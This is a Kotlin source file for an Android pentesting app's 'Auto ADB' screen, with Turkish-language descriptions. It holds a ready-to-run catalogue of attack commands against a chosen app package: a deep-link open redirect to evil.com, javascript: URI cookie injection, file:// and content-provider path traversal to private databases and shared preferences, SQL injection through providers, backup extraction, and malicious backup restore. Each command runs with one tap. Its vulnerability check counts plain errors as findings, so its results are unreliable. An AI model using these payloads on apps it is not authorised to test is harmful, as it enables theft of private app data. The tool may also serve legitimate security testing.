package com.androhunter.app.ui.autoadb

import android.content.pm.PackageManager
import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.androhunter.app.ui.common.HunterTopBar
import com.androhunter.app.ui.theme.*
import kotlinx.coroutines.*

enum class AdbCategory(val label: String, val color: Color) {
    EXPORTED   ("Exported Components",      Color(0xFF00FF88)),
    DEEPLINK   ("Deep Link / Intent Scheme", Color(0xFF58A6FF)),
    PROVIDER   ("Content Provider Traversal",Color(0xFFFFAA00)),
    BACKUP     ("Backup Abuse",              Color(0xFFBC8CFF)),
}

data class AdbCommand(
    val category: AdbCategory,
    val title: String,
    val description: String,
    val commandTemplate: String,  // {PKG} placeholder
    val severity: String,         // HIGH / MEDIUM / INFO
    val cveRef: String = ""
)

data class AdbResult(
    val command: String,
    val output: String,
    val isVuln: Boolean,
    val severity: String
)

val AUTO_ADB_COMMANDS = listOf(
    // ── Exported Components ──────────────────────────────
    AdbCommand(AdbCategory.EXPORTED, "Launch Exported Activity",
        "Hedef uygulamanın exported activity'sini doğrudan başlat",
        "am start -n {PKG}/\$(dumpsys package {PKG} | grep 'Activity' | grep 'exported=true' | head -1 | awk '{print \$1}')",
        "HIGH"),
    AdbCommand(AdbCategory.EXPORTED, "Broadcast to Exported Receivers",
        "Exported receiver'lara boş broadcast gönder",
        "for r in \$(dumpsys package {PKG} | grep -A1 'Receiver' | grep '{PKG}' | awk '{print \$1}'); do am broadcast -a android.intent.action.VIEW -n {PKG}/\$r; done",
        "HIGH"),
    AdbCommand(AdbCategory.EXPORTED, "Start Service",
        "Exported service'leri başlatmayı dene",
        "am startservice -n {PKG}/\$(dumpsys package {PKG} | grep 'Service' | grep '{PKG}' | head -1 | awk '{print \$1}')",
        "MEDIUM"),
    AdbCommand(AdbCategory.EXPORTED, "Dump Exported Components",
        "Tüm exported component'ları listele",
        "dumpsys package {PKG} | grep -E 'exported=true|Activity|Receiver|Service' | grep -B1 'exported=true'",
        "INFO"),

    // ── Deep Link / Intent Scheme ─────────────────────────
    AdbCommand(AdbCategory.DEEPLINK, "Enumerate Intent Filters",
        "Tüm intent-filter'ları ve scheme'leri listele",
        "dumpsys package {PKG} | grep -E 'scheme|host|action|category' | sort -u",
        "INFO"),
    AdbCommand(AdbCategory.DEEPLINK, "Open Redirect via Deep Link",
        "Deep link üzerinden open redirect dene",
        "am start -a android.intent.action.VIEW -d 'intent://evil.com#Intent;scheme=https;package={PKG};end'",
        "HIGH", "CVE-2023-20963"),
    AdbCommand(AdbCategory.DEEPLINK, "JavaScript URI Injection",
        "WebView'e javascript: URI enjekte et",
        "am start -a android.intent.action.VIEW -d 'javascript:alert(document.cookie)' -p {PKG}",
        "HIGH"),
    AdbCommand(AdbCategory.DEEPLINK, "File URI Leak",
        "file:// URI ile local dosya okuma dene",
        "am start -a android.intent.action.VIEW -d 'file:///data/data/{PKG}/shared_prefs/' -p {PKG}",
        "HIGH"),
    AdbCommand(AdbCategory.DEEPLINK, "OAuth Redirect Hijack",
        "OAuth callback redirect URL manipülasyonu",
        "am start -a android.intent.action.VIEW -d '\$(dumpsys package {PKG} | grep scheme | head -1 | awk -F= \"{print \\$2}\")://oauth/callback?code=TEST&state=INJECT' -p {PKG}",
        "HIGH"),

    // ── Content Provider ─────────────────────────────────
    AdbCommand(AdbCategory.PROVIDER, "Query All Providers",
        "Tüm content provider'ları sorgula",
        "dumpsys package {PKG} | grep -A3 'Provider' | grep authority | awk -F= '{print \"content://\"\$2}' | xargs -I{} content query --uri {}",
        "HIGH"),
    AdbCommand(AdbCategory.PROVIDER, "Path Traversal via Provider",
        "../ ile dizin traversal dene",
        "content read --uri 'content://\$(dumpsys package {PKG} | grep authority | head -1 | awk -F= \"{print \\$2}\")/../../../data/data/{PKG}/databases/'",
        "HIGH", "CVE-2021-0928"),
    AdbCommand(AdbCategory.PROVIDER, "Read SharedPrefs via Provider",
        "FileProvider üzerinden shared preferences oku",
        "content read --uri 'content://\$(dumpsys package {PKG} | grep fileprovider | head -1 | awk -F: \"{print \\$2}\")/root/../shared_prefs/\$(ls /data/data/{PKG}/shared_prefs/ 2>/dev/null | head -1)'",
        "HIGH"),
    AdbCommand(AdbCategory.PROVIDER, "SQL Injection via Provider",
        "Content provider'a SQL injection dene",
        "content query --uri 'content://\$(dumpsys package {PKG} | grep authority | head -1 | awk -F= \"{print \\$2}\")/' --where \"1=1 UNION SELECT name,sql,3 FROM sqlite_master--\"",
        "HIGH"),

    // ── Backup Abuse ─────────────────────────────────────
    AdbCommand(AdbCategory.BACKUP, "Check Backup Enabled",
        "android:allowBackup=true kontrolü",
        "aapt dump badging \$(pm path {PKG} | cut -d: -f2) 2>/dev/null | grep -i backup || dumpsys package {PKG} | grep -i backup",
        "MEDIUM"),
    AdbCommand(AdbCategory.BACKUP, "Extract Backup",
        "ADB backup ile uygulama verilerini çek",
        "adb backup -f /sdcard/backup_{PKG}.ab -noapk {PKG} && dd if=/sdcard/backup_{PKG}.ab bs=24 skip=1 | python3 -c \"import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))\" | tar -xvf -",
        "HIGH"),
    AdbCommand(AdbCategory.BACKUP, "Restore Malicious Backup",
        "Zararlı veri ile backup restore et (veri enjeksiyonu)",
        "adb restore /sdcard/malicious_{PKG}.ab",
        "MEDIUM"),
)

@Composable
fun AutoAdbScreen(packageName: String, onBack: () -> Unit) {
    val context   = LocalContext.current
    val clipboard = LocalClipboardManager.current
    val scope     = rememberCoroutineScope()
    val results   = remember { mutableStateListOf<AdbResult>() }
    val logState  = rememberLazyListState()

    var selectedCategory by remember { mutableStateOf<AdbCategory?>(null) }
    var running          by remember { mutableStateOf(false) }
    var expandedCmd      by remember { mutableStateOf<String?>(null) }

    fun resolvedCmd(template: String) = template.replace("{PKG}", packageName)

    fun runCmd(cmd: String, severity: String) {
        running = true
        scope.launch(Dispatchers.IO) {
            try {
                val proc   = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
                val stdout = proc.inputStream.bufferedReader().readText()
                val stderr = proc.errorStream.bufferedReader().readText()
                proc.waitFor()
                val output = (stdout + stderr).trim().ifBlank { "(no output)" }

                // Vuln detection patterns
                val vulnPatterns = listOf(
                    "Starting:", "Broadcasting:", "result=0",
                    "content://", "rows:", "Row:", "_id=",
                    "Error", "exception", "Failure"
                )
                val isVuln = vulnPatterns.any { output.contains(it, ignoreCase = true) } &&
                             !output.contains("Security exception", ignoreCase = true)

                withContext(Dispatchers.Main) {
                    results.add(0, AdbResult(cmd.take(60) + "...", output, isVuln, severity))
                    running = false
                    if (results.isNotEmpty()) scope.launch { logState.scrollToItem(0) }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    results.add(0, AdbResult(cmd.take(60), "ERR: ${e.message}", false, severity))
                    running = false
                }
            }
        }
    }

    Column(Modifier.fillMaxSize().background(HunterBg)) {
        HunterTopBar("AUTO ADB", onBack)
        Text("  $packageName", color = HunterTextDim, fontFamily = FontFamily.Monospace,
            fontSize = 11.sp, modifier = Modifier.padding(horizontal = 16.dp, vertical = 4.dp))

        // Category filter tabs
        Row(
            Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 8.dp),
            horizontalArrangement = Arrangement.spacedBy(6.dp)
        ) {
            FilterChip(
                selected = selectedCategory == null,
                onClick  = { selectedCategory = null },
                label    = { Text("ALL", fontFamily = FontFamily.Monospace, fontSize = 10.sp) },
                colors   = FilterChipDefaults.filterChipColors(
                    containerColor = HunterCard, labelColor = HunterTextDim,
                    selectedContainerColor = HunterGreen.copy(alpha = 0.2f),
                    selectedLabelColor = HunterGreen)
            )
            AdbCategory.values().forEach { cat ->
                FilterChip(
                    selected = selectedCategory == cat,
                    onClick  = { selectedCategory = if (selectedCategory == cat) null else cat },
                    label    = { Text(cat.name, fontFamily = FontFamily.Monospace, fontSize = 10.sp) },
                    colors   = FilterChipDefaults.filterChipColors(
                        containerColor = HunterCard, labelColor = HunterTextDim,
                        selectedContainerColor = cat.color.copy(alpha = 0.2f),
                        selectedLabelColor = cat.color)
                )
            }
        }

        val filtered = AUTO_ADB_COMMANDS.filter { selectedCategory == null || it.category == selectedCategory }

        LazyColumn(
            contentPadding = PaddingValues(horizontal = 16.dp, vertical = 4.dp),
            modifier = Modifier.weight(if (results.isEmpty()) 1f else 0.55f)
        ) {
            items(filtered) { cmd ->
                val resolved = resolvedCmd(cmd.commandTemplate)
                val isExpanded = expandedCmd == cmd.title

                Column(
                    Modifier
                        .fillMaxWidth()
                        .background(HunterCard, RoundedCornerShape(6.dp))
                        .border(1.dp,
                            when (cmd.severity) {
                                "HIGH"   -> HunterRed.copy(alpha = 0.4f)
                                "MEDIUM" -> HunterYellow.copy(alpha = 0.3f)
                                else     -> HunterBorder
                            },
                            RoundedCornerShape(6.dp))
                        .clickable { expandedCmd = if (isExpanded) null else cmd.title }
                        .padding(12.dp)
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Column(Modifier.weight(1f)) {
                            Row(verticalAlignment = Alignment.CenterVertically,
                                horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                                SeverityBadge(cmd.severity)
                                Text(cmd.title, color = cmd.category.color,
                                    fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold,
                                    fontSize = 12.sp)
                            }
                            Text(cmd.description, color = HunterTextDim,
                                fontFamily = FontFamily.Monospace, fontSize = 10.sp)
                            if (cmd.cveRef.isNotBlank()) {
                                Text(cmd.cveRef, color = HunterRed,
                                    fontFamily = FontFamily.Monospace, fontSize = 9.sp)
                            }
                        }
                        Icon(
                            if (isExpanded) Icons.Default.KeyboardArrowUp else Icons.Default.KeyboardArrowDown,
                            null, tint = HunterBorder, modifier = Modifier.size(16.dp))
                    }

                    AnimatedVisibility(visible = isExpanded) {
                        Column {
                            Spacer(Modifier.height(8.dp))
                            HorizontalDivider(color = HunterBorder, thickness = 0.5.dp)
                            Spacer(Modifier.height(8.dp))

                            // Command preview
                            Text(resolved, color = HunterGreen, fontFamily = FontFamily.Monospace,
                                fontSize = 10.sp,
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .background(HunterSurface, RoundedCornerShape(4.dp))
                                    .padding(8.dp))

                            Spacer(Modifier.height(8.dp))
                            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                Button(
                                    onClick = { runCmd(resolved, cmd.severity) },
                                    modifier = Modifier.weight(1f).height(36.dp),
                                    enabled  = !running,
                                    colors   = ButtonDefaults.buttonColors(
                                        containerColor = cmd.category.color),
                                    shape = RoundedCornerShape(4.dp)
                                ) {
                                    if (running) {
                                        CircularProgressIndicator(
                                            color = HunterBg, strokeWidth = 2.dp,
                                            modifier = Modifier.size(14.dp))
                                    } else {
                                        Text("[ RUN ]", color = HunterBg,
                                            fontFamily = FontFamily.Monospace,
                                            fontWeight = FontWeight.Bold, fontSize = 11.sp)
                                    }
                                }
                                OutlinedButton(
                                    onClick = { clipboard.setText(AnnotatedString(resolved)) },
                                    modifier = Modifier.weight(1f).height(36.dp),
                                    colors   = ButtonDefaults.outlinedButtonColors(contentColor = HunterTextDim),
                                    border   = androidx.compose.foundation.BorderStroke(1.dp, HunterBorder),
                                    shape    = RoundedCornerShape(4.dp)
                                ) {
                                    Text("[ COPY ]", fontFamily = FontFamily.Monospace,
                                        fontWeight = FontWeight.Bold, fontSize = 11.sp)
                                }
                            }
                        }
                    }
                }
                Spacer(Modifier.height(4.dp))
            }
        }

        // Results panel
        if (results.isNotEmpty()) {
            HorizontalDivider(color = HunterBorder)
            Column(Modifier.weight(0.45f)) {
                Row(
                    Modifier.fillMaxWidth().background(HunterSurface)
                        .padding(horizontal = 16.dp, vertical = 6.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text("SONUÇLAR (${results.size})", color = HunterTextDim,
                        fontFamily = FontFamily.Monospace, fontSize = 11.sp,
                        modifier = Modifier.weight(1f))
                    TextButton(onClick = { results.clear() }) {
                        Text("Temizle", color = HunterRed, fontFamily = FontFamily.Monospace, fontSize = 11.sp)
                    }
                }
                LazyColumn(
                    state = logState,
                    contentPadding = PaddingValues(horizontal = 16.dp, vertical = 4.dp),
                    reverseLayout = true
                ) {
                    items(results) { r ->
                        Column(
                            Modifier.fillMaxWidth()
                                .background(
                                    if (r.isVuln) HunterRed.copy(alpha = 0.08f) else HunterCard,
                                    RoundedCornerShape(4.dp))
                                .border(1.dp,
                                    if (r.isVuln) HunterRed.copy(alpha = 0.4f) else HunterBorder,
                                    RoundedCornerShape(4.dp))
                                .padding(8.dp)
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically,
                                horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                                Text(if (r.isVuln) "⚠ VULN" else "● INFO",
                                    color = if (r.isVuln) HunterRed else HunterTextDim,
                                    fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold,
                                    fontSize = 10.sp)
                                Text(r.command, color = HunterGreen, fontFamily = FontFamily.Monospace,
                                    fontSize = 10.sp, maxLines = 1)
                            }
                            Text(r.output.take(300), color = Color(0xFFE6EDF3),
                                fontFamily = FontFamily.Monospace, fontSize = 10.sp)
                        }
                        Spacer(Modifier.height(4.dp))
                    }
                }
            }
        }
    }
}

@Composable
private fun SeverityBadge(severity: String) {
    val color = when (severity) {
        "HIGH"   -> HunterRed
        "MEDIUM" -> HunterYellow
        else     -> HunterTextDim
    }
    Surface(color = color.copy(alpha = 0.15f), shape = RoundedCornerShape(3.dp)) {
        Text(severity, color = color, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold,
            fontSize = 8.sp, modifier = Modifier.padding(horizontal = 5.dp, vertical = 2.dp))
    }
}
